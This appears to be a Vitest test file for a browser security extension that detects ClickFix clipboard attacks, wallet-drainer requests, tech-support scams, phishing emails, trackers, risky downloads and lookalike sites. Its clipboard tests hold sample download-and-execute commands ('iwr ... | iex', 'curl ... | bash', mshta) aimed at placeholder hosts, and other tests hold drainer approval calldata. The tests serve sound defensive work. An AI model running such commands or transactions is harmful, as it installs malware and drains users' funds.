import { describe, it, expect } from 'vitest';
import {
  isMaliciousClipboardCommand,
  shouldBlockClipboardWrite,
  classifyWalletRequest,
  techSupportScamScore,
  TECH_SUPPORT_WARN,
  isNotificationBait,
  type BehaviorKind,
} from './scamBehavior';
import { analyzeEmailLink, analyzeAttachmentName, analyzeReplyTo, findReplyTo, domainClaimedByText } from './emailGuard';
import { trackerFor, blockableTrackerDomains, trackingCookieOwner } from './trackerList';
import { decideDownload, fileExtension } from './downloadGuard';
import { installOriginFindings } from './extensionAudit';
import { detectScamCues } from './pageContent';

describe('ClickFix clipboard guard', () => {
  it('flags command-shaped clipboard text', () => {
    expect(isMaliciousClipboardCommand('powershell -w hidden -c "iwr http://x.test/a.ps1 | iex"')).toBe(true);
    expect(isMaliciousClipboardCommand('curl -s http://x.test/i | bash')).toBe(true);
    expect(isMaliciousClipboardCommand('Hello, here is my address')).toBe(false);
  });
  it('blocks with Run-dialog instructions or a fake verification comment', () => {
    const cmd = 'powershell -c "iwr https://evil.test/p | iex"';
    expect(shouldBlockClipboardWrite(cmd, 'Press Windows + R, then press Ctrl + V and Enter to verify you are human')).toBe(true);
    expect(shouldBlockClipboardWrite('cmd /c start x # I am not a robot - Cloudflare Ray ID 1234', '')).toBe(true);
    expect(shouldBlockClipboardWrite('mshta https://evil.test/x.hta', '')).toBe(true);
  });
  it('does not block install instructions on documentation pages', () => {
    expect(shouldBlockClipboardWrite('curl -fsSL https://get.docker.com | sh', 'Install Docker Engine using the convenience script')).toBe(false);
    expect(shouldBlockClipboardWrite('iwr -useb get.scoop.sh | iex', 'Open a PowerShell terminal and run')).toBe(false);
  });
});

describe('wallet drainer classification', () => {
  const addr = '000000000000000000000000' + '1'.repeat(40);
  it('flags blind signing and permits', () => {
    expect(classifyWalletRequest('eth_sign', ['0xabc', '0xdef']).level).toBe('danger');
    const permit = JSON.stringify({ primaryType: 'Permit', domain: { name: 'USD Coin' }, message: {} });
    expect(classifyWalletRequest('eth_signTypedData_v4', ['0xabc', permit]).level).toBe('danger');
  });
  it('flags unlimited approvals and setApprovalForAll', () => {
    const unlimited = '0x095ea7b3' + addr + 'f'.repeat(64);
    expect(classifyWalletRequest('eth_sendTransaction', [{ data: unlimited }]).level).toBe('danger');
    const limited = '0x095ea7b3' + addr + '0'.repeat(60) + '03e8';
    expect(classifyWalletRequest('eth_sendTransaction', [{ data: limited }]).level).toBe('caution');
    const all = '0xa22cb465' + addr + '0'.repeat(63) + '1';
    expect(classifyWalletRequest('eth_sendTransaction', [{ data: all }]).level).toBe('danger');
  });
  it('ignores ordinary requests', () => {
    expect(classifyWalletRequest('eth_requestAccounts', []).level).toBeNull();
    expect(classifyWalletRequest('eth_sendTransaction', [{ to: '0x1', value: '0x1' }]).level).toBeNull();
    expect(classifyWalletRequest('personal_sign', ['0x', '0x']).level).toBeNull();
  });
});

describe('tech-support scam scoring', () => {
  const set = (...k: BehaviorKind[]) => new Set<BehaviorKind>(k);
  it('warns on lock-in plus scam wording', () => {
    const cues = detectScamCues('WARNING: Your computer is infected! Call Microsoft Support toll-free now');
    expect(techSupportScamScore(set('fullscreen', 'beforeunload'), cues)).toBeGreaterThanOrEqual(TECH_SUPPORT_WARN);
  });
  it('does not warn on a video site going full screen', () => {
    expect(techSupportScamScore(set('fullscreen', 'autoplay_audio'), [])).toBeLessThan(TECH_SUPPORT_WARN);
    expect(techSupportScamScore(set('fullscreen', 'pointer_lock', 'beforeunload'), [])).toBeLessThan(TECH_SUPPORT_WARN);
  });
  it('warns on the classic keyboard + fullscreen lock-in', () => {
    expect(techSupportScamScore(set('fullscreen', 'keyboard_lock', 'history_flood'), [])).toBeGreaterThanOrEqual(TECH_SUPPORT_WARN);
  });
  it('treats a phone number next to virus wording as tech-support', () => {
    expect(detectScamCues('Security Alert: Trojan spyware detected. Call +1 (888) 555-0199 immediately')).toContain('tech_support');
    expect(detectScamCues('Contact sales: +1 (888) 555-0199')).not.toContain('tech_support');
  });
  it('recognises notification bait', () => {
    expect(isNotificationBait(true, 'Click Allow to verify you are not a robot')).toBe(true);
    expect(isNotificationBait(false, 'Latest news', [])).toBe(false);
    expect(isNotificationBait(false, '', ['tech_support'])).toBe(true);
  });
});

describe('email guard', () => {
  it('flags link text that claims another domain', () => {
    expect(domainClaimedByText('www.paypal.com')).toBe('paypal.com');
    const f = analyzeEmailLink('https://www.paypal.com/signin', 'https://paypal-secure-login.xyz/verify');
    expect(f?.level).toBe('danger');
    expect(f?.reasons.join(' ')).toMatch(/paypal\.com/);
  });
  it('leaves matching links alone', () => {
    expect(analyzeEmailLink('Open GitHub', 'https://github.com/notifications')).toBeNull();
    expect(analyzeEmailLink('github.com', 'https://github.com/')).toBeNull();
    expect(analyzeEmailLink('mail me', 'mailto:a@b.com')).toBeNull();
  });
  it('flags IP links and javascript links', () => {
    expect(analyzeEmailLink('Click', 'http://192.168.10.5/login')?.level).toBe('danger');
    expect(analyzeEmailLink('Click', 'javascript:alert(1)')?.level).toBe('danger');
  });
  it('flags risky attachments', () => {
    expect(analyzeAttachmentName('invoice.pdf.exe')?.reasons[0]).toMatch(/Disguised as a \.pdf/);
    expect(analyzeAttachmentName('statement.html')?.level).toBe('caution');
    expect(analyzeAttachmentName('report.pdf')).toBeNull();
  });
  it('flags a Reply-To that goes elsewhere', () => {
    expect(findReplyTo('From: Bank <alerts@bank.com>\nReply-To: Support <help.bank@gmail.com>')).toBe('help.bank@gmail.com');
    expect(analyzeReplyTo('alerts@bank.com', 'help.bank@gmail.com')?.level).toBe('danger');
    expect(analyzeReplyTo('alerts@bank.com', 'support@bank.com')).toBeNull();
  });
});

describe('tracker list', () => {
  it('recognises trackers by domain and subdomain', () => {
    expect(trackerFor('www.google-analytics.com')?.company).toBe('Google');
    expect(trackerFor('stats.g.doubleclick.net')?.category).toBe('advertising');
    expect(trackerFor('example.com')).toBeNull();
  });
  it('never blocks t.co navigation links', () => {
    expect(blockableTrackerDomains()).not.toContain('t.co');
    expect(blockableTrackerDomains().length).toBeGreaterThan(100);
  });
  it('labels tracking cookies by name', () => {
    expect(trackingCookieOwner('_ga')).toBe('Google Analytics');
    expect(trackingCookieOwner('_fbp')).toBe('Meta Pixel');
    expect(trackingCookieOwner('sessionid')).toBeNull();
  });
});

describe('download guard', () => {
  const base = { filename: '', url: 'https://example.com/file', blocklisted: false, remoteDecision: null, domainAgeDays: -1, isHttp: false };
  it('reads extensions from names and URLs', () => {
    expect(fileExtension('C:\\Users\\a\\Downloads\\setup.EXE')).toBe('exe');
    expect(fileExtension('https://x.test/a/b.zip?x=1')).toBe('zip');
    expect(fileExtension('https://x.test/download')).toBe('');
  });
  it('blocks known-bad sources', () => {
    expect(decideDownload({ ...base, blocklisted: true }).action).toBe('block');
    expect(decideDownload({ ...base, remoteDecision: 'block' }).action).toBe('block');
  });
  it('warns on runnable files from new, suspicious or HTTP sources', () => {
    expect(decideDownload({ ...base, filename: 'setup.exe', domainAgeDays: 3 }).action).toBe('warn');
    expect(decideDownload({ ...base, filename: 'a.zip', remoteDecision: 'warn' }).action).toBe('warn');
    expect(decideDownload({ ...base, filename: 'tool.msi', isHttp: true }).action).toBe('warn');
  });
  it('allows documents and established sources', () => {
    expect(decideDownload({ ...base, filename: 'report.pdf', domainAgeDays: 2 }).action).toBe('allow');
    expect(decideDownload({ ...base, filename: 'setup.exe', domainAgeDays: 4000 }).action).toBe('allow');
  });
});

describe('extension checkup origin', () => {
  it('flags developer-mode, sideloaded, off-store and known-malicious extensions', () => {
    expect(installOriginFindings({ installType: 'development' })[0][1]).toMatch(/developer mode/);
    expect(installOriginFindings({ installType: 'sideload' })[0][1]).toMatch(/another program/);
    expect(installOriginFindings({ installType: 'normal', updateUrl: 'https://evil.test/update.xml' })[0][1]).toMatch(/outside the official store/);
    expect(installOriginFindings({ installType: 'normal', updateUrl: 'https://clients2.google.com/service/update2/crx' })).toEqual([]);
    expect(installOriginFindings({ id: 'abc' }, new Set(['abc']))[0][0]).toBe(100);
  });
});

import { dHashRGBA, hammingHex, matchFaviconBrand } from './faviconHash';
import { FAVICON_BRANDS } from './faviconBrands';
import { webRiskAdvisoryFromSignals, webRiskAdvisoryFromThreatType, GOOGLE_NO_GUARANTEE_NOTICE } from './webRiskAttribution';
import { threatReason } from './shieldEngine';

describe('on-device favicon impersonation', () => {
  const icon = (bar: number, size = 32) => {
    const px = new Uint8ClampedArray(size * size * 4);
    for (let y = 0; y < size; y++)
      for (let x = 0; x < size; x++) {
        const i = (y * size + x) * 4;
        const dark = x >= bar && x < bar + size / 4;
        px[i] = dark ? 0 : 255;
        px[i + 1] = dark ? 48 : 255;
        px[i + 2] = dark ? 135 : 255;
        px[i + 3] = 255;
      }
    return px;
  };
  it('hashes deterministically and is scale-tolerant', () => {
    const a = dHashRGBA(icon(4), 32, 32)!;
    expect(a).toMatch(/^[0-9a-f]{16}$/);
    expect(hammingHex(a, dHashRGBA(icon(8, 64), 64, 64)!)).toBeLessThanOrEqual(4);
    expect(hammingHex(a, dHashRGBA(icon(20), 32, 32)!)).toBeGreaterThan(4);
  });
  it('rejects blank icons', () => {
    expect(dHashRGBA(new Uint8ClampedArray(16 * 16 * 4).fill(255), 16, 16)).toBeNull();
  });
  it('matches a copied brand icon only off the brand domain', () => {
    const paypal = FAVICON_BRANDS.find((b) => b.brand === 'paypal')!.hashes[0];
    expect(matchFaviconBrand(paypal, 'paypa1-login.example', FAVICON_BRANDS)).toBe('paypal');
    expect(matchFaviconBrand(paypal, 'www.paypal.com', FAVICON_BRANDS)).toBeNull();
    expect(matchFaviconBrand('ffffffffffffffff', 'example.com', FAVICON_BRANDS)).toBeNull();
  });
  it('keeps reference brands well apart from each other', () => {
    for (const a of FAVICON_BRANDS)
      for (const b of FAVICON_BRANDS)
        if (a.brand !== b.brand && !a.domains.some((d) => b.domains.includes(d)))
          for (const x of a.hashes) for (const y of b.hashes) expect(hammingHex(x, y)).toBeGreaterThan(8);
  });
});

describe('Google Web Risk attribution', () => {
  it('attributes Google verdicts with the advisory link', () => {
    const a = webRiskAdvisoryFromSignals({ google_web_risk: 'phishing_hit', virustotal: 'clean' });
    expect(a?.text).toBe('Advisory provided by Google');
    expect(a?.learnMoreUrl).toContain('antiphishing.org');
    expect(webRiskAdvisoryFromSignals({ google_web_risk: 'clean' })).toBeNull();
    expect(webRiskAdvisoryFromThreatType('MALWARE')?.learnMoreUrl).toContain('malware');
    expect(webRiskAdvisoryFromThreatType('XORAPASS_BLOCKLIST')).toBeNull();
  });
  it('uses qualified wording and the no-guarantee notice', () => {
    expect(threatReason('SOCIAL_ENGINEERING')).toMatch(/suspected/);
    expect(threatReason('MALWARE')).toMatch(/may/);
    expect(GOOGLE_NO_GUARANTEE_NOTICE).toMatch(/cannot guarantee/);
  });
});

import { isLocalOrPrivateHost } from './localHosts';
import { mergeLocalAndRemoteRisk } from './domainRiskService';
import { assessDomainRisk } from './domainRisk';

describe('local and private hosts', () => {
  it('skips the user\'s own machine and network', () => {
    for (const h of ['localhost', 'localhost:3000', 'app.localhost', '127.0.0.1', '192.168.1.20', '10.0.0.5', '172.20.1.1', '[::1]', '[::1]:8080', 'printer.local', 'nas.home.arpa', '100.101.1.2', 'api.internal'])
      expect(isLocalOrPrivateHost(h)).toBe(true);
    for (const h of ['yify.pro', '8.8.8.8', 'paypal.com', 'local.example.com', '172.32.0.1'])
      expect(isLocalOrPrivateHost(h)).toBe(false);
  });
});

describe('per-user allowlist approval', () => {
  it('an approval for this account overrides local heuristics', () => {
    const local = { ...assessDomainRisk('paypa1.com', ['paypal.com'], [], 'https://paypa1.com/'), decision: 'block' as const };
    const merged = mergeLocalAndRemoteRisk(local, {
      decision: 'allow', risk_score: 20, risk_level: 'safe', reasons: ['An administrator approved this site for your account.'],
      reason_codes: ['TYPOSQUATTING_DETECTED', 'USER_ALLOWLIST_APPROVED'],
    } as any);
    expect(merged.decision).toBe('allow');
    const notApproved = mergeLocalAndRemoteRisk(local, { decision: 'allow', risk_score: 0, risk_level: 'safe', reasons: [], reason_codes: [] } as any);
    expect(notApproved.decision).toBe('block');
  });
});
